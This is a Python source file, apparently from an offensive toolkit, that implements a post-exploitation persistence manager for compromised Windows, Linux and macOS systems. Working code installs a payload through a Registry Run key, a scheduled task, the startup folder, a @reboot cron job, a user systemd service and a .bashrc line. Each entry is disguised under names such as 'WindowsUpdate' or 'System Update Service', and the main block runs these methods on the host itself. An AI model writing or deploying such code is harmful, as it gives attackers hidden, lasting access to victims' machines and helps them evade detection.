"""
Post-Exploitation Module - Persistence
Establishes persistence mechanisms on compromised systems
"""

import os
import platform
import subprocess
from typing import Dict, Tuple

from utils.logger import logger


class PersistenceManager:
    """
    Persistence Manager
    Establishes various persistence mechanisms
    """
    
    def __init__(self):
        self.os_type = platform.system()
        self.methods = []
        self._load_methods()
    
    def _load_methods(self):
        """Load OS-specific persistence methods"""
        if self.os_type == "Windows":
            self.methods = [
                self._windows_registry_run,
                self._windows_scheduled_task,
                self._windows_startup_folder,
                self._windows_service
            ]
        elif self.os_type in ["Linux", "Darwin"]:
            self.methods = [
                self._linux_cron_job,
                self._linux_systemd_service,
                self._linux_bashrc,
                self._linux_init_script
            ]
    
    def establish_persistence(self, payload_path: str) -> Tuple[bool, Dict]:
        """
        Establish persistence
        
        Args:
            payload_path: Path to payload to persist
        
        Returns:
            (success, details)
        """
        logger.info(f"Establishing persistence on {self.os_type}")
        
        for method in self.methods:
            try:
                success, details = method(payload_path)
                if success:
                    logger.success(f"Persistence established: {details['method']}")
                    return True, details
            except Exception as e:
                logger.debug(f"Persistence method failed: {e}")
        
        logger.warning("All persistence methods failed")
        return False, {}
    
    # Windows Methods
    def _windows_registry_run(self, payload_path: str) -> Tuple[bool, Dict]:
        """Add to Windows Registry Run key"""
        logger.debug("Attempting Registry Run key persistence")
        
        try:
            import winreg
            
            # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(
                key,
                "WindowsUpdate",  # Name
                0,
                winreg.REG_SZ,
                payload_path
            )
            
            winreg.CloseKey(key)
            
            return True, {
                'method': 'Registry_Run_Key',
                'location': f"HKCU\\{key_path}",
                'name': 'WindowsUpdate'
            }
        except Exception as e:
            logger.debug(f"Registry persistence failed: {e}")
            return False, {}
    
    def _windows_scheduled_task(self, payload_path: str) -> Tuple[bool, Dict]:
        """Create scheduled task"""
        logger.debug("Attempting scheduled task persistence")
        
        try:
            # Create scheduled task using schtasks
            task_name = "WindowsUpdateCheck"
            
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', payload_path,
                '/sc', 'onlogon',
                '/f'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                return True, {
                    'method': 'Scheduled_Task',
                    'task_name': task_name,
                    'trigger': 'onlogon'
                }
        except Exception as e:
            logger.debug(f"Scheduled task persistence failed: {e}")
        
        return False, {}
    
    def _windows_startup_folder(self, payload_path: str) -> Tuple[bool, Dict]:
        """Copy to startup folder"""
        logger.debug("Attempting startup folder persistence")
        
        try:
            import shutil
            
            startup_folder = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            if os.path.exists(startup_folder):
                dest = os.path.join(startup_folder, 'WindowsUpdate.exe')
                shutil.copy2(payload_path, dest)
                
                return True, {
                    'method': 'Startup_Folder',
                    'location': dest
                }
        except Exception as e:
            logger.debug(f"Startup folder persistence failed: {e}")
        
        return False, {}
    
    def _windows_service(self, payload_path: str) -> Tuple[bool, Dict]:
        """Create Windows service"""
        logger.debug("Attempting service persistence")
        
        # Requires admin privileges
        # Real implementation would use sc.exe or Windows API
        
        return False, {}
    
    # Linux Methods
    def _linux_cron_job(self, payload_path: str) -> Tuple[bool, Dict]:
        """Add cron job"""
        logger.debug("Attempting cron job persistence")
        
        try:
            # Add to user crontab
            cron_entry = f"@reboot {payload_path}\n"
            
            # Get current crontab
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True
            )
            
            current_crontab = result.stdout if result.returncode == 0 else ""
            
            # Add new entry
            new_crontab = current_crontab + cron_entry
            
            # Write new crontab
            process = subprocess.Popen(
                ['crontab', '-'],
                stdin=subprocess.PIPE,
                text=True
            )
            process.communicate(new_crontab)
            
            if process.returncode == 0:
                return True, {
                    'method': 'Cron_Job',
                    'trigger': '@reboot',
                    'path': payload_path
                }
        except Exception as e:
            logger.debug(f"Cron persistence failed: {e}")
        
        return False, {}
    
    def _linux_systemd_service(self, payload_path: str) -> Tuple[bool, Dict]:
        """Create systemd service"""
        logger.debug("Attempting systemd service persistence")
        
        try:
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            
            service_path = os.path.expanduser('~/.config/systemd/user/update.service')
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable service
            subprocess.run(['systemctl', '--user', 'enable', 'update.service'])
            
            return True, {
                'method': 'Systemd_Service',
                'service_file': service_path
            }
        except Exception as e:
            logger.debug(f"Systemd persistence failed: {e}")
        
        return False, {}
    
    def _linux_bashrc(self, payload_path: str) -> Tuple[bool, Dict]:
        """Add to .bashrc"""
        logger.debug("Attempting .bashrc persistence")
        
        try:
            bashrc_path = os.path.expanduser('~/.bashrc')
            
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'a') as f:
                    f.write(f"\n# System update\n{payload_path} &\n")
                
                return True, {
                    'method': 'Bashrc',
                    'file': bashrc_path
                }
        except Exception as e:
            logger.debug(f"Bashrc persistence failed: {e}")
        
        return False, {}
    
    def _linux_init_script(self, payload_path: str) -> Tuple[bool, Dict]:
        """Create init script"""
        logger.debug("Attempting init script persistence")
        
        # Requires root privileges
        # Real implementation would create /etc/init.d/ script
        
        return False, {}


if __name__ == "__main__":
    manager = PersistenceManager()
    
    print("="*60)
    print("PERSISTENCE TEST")
    print("="*60)
    print(f"OS: {manager.os_type}")
    print(f"Methods available: {len(manager.methods)}")
    print("="*60)
    
    # Test persistence (with dummy payload)
    success, details = manager.establish_persistence("/tmp/test_payload")
    if success:
        print(f"✓ Persistence established: {details}")
    else:
        print("✗ Persistence failed")
